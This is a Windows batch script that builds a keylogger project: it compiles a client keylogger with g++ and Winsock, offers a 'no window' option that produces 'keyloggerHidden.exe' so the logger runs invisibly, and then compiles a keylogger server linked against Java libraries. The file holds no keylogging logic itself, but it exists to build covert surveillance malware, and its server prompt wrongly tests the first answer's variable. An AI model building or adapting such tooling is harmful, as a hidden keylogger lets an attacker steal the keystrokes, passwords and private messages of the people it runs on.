@echo off

:winprompt
set /P windowd=Do you want to compile the keylogger with no window[Y/N]?
if /I "%windowd%" EQU "Y" goto :option_nowindow
if /I "%windowd%" EQU "N" goto :option_window
goto :winprompt

:option_window

g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -o .\KeyLoggerSoftware\client\keylogger.exe

goto :ServerCompile
:option_nowindow
g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -mwindows -o .\KeyLoggerSoftware\client\keyloggerHidden.exe

:ServerCompile
echo complete
:Server
set /P Serv=Do you want to compile the keylogger Server at this time[Y/N]?
if /I "%windowd%" EQU "Y" goto :ServerCompiler
if /I "%windowd%" EQU "N" goto :exit
goto :Server
:ServerCompiler
echo %cd%
mingw32-g++.exe  -O2 -std=c++11 -I"C:\Program Files\Java\jdk1.8.0_191\include" -I"C:\Program Files\Java\jdk1.8.0_191\include\win32" -I"C:\Program Files (x86)\Java\jdk1.8.0_191\include\win32" -I"C:\Program Files (x86)\Java\jdk1.8.0_191\include" -c C:\Users\Qu3b411\Desktop\KeyLogger-master_2\KeyLogger-master\KeyLoggerSoftware\server\main.cpp -o %cd%\KeyLoggerSoftware\server\keyloggerserver.o
mingw32-g++.exe -L"C:\Program Files (x86)\Java\jdk1.8.0_191\jre\bin\server" -L"C:\Program Files (x86)\Java\jdk1.8.0_191\jre\bin\plugin2" -L"C:\Program Files (x86)\Java\jdk1.8.0_191\jre\bin\server" -L"C:\Program Files (x86)\Java\jre1.8.0_191\bin\client" -o %cd%\KeyLoggerSoftware\server\keyloggerServerGui.exe %cd%\KeyLoggerSoftware\server\keyloggerserver.o  -s -lws2_32 -std=c++11  "C:\Program Files (x86)\Java\jdk1.8.0_191\lib\jvm.lib" "C:\Program Files (x86)\Java\jdk1.8.0_191\lib\jawt.lib"



echo complete

:exit

pause
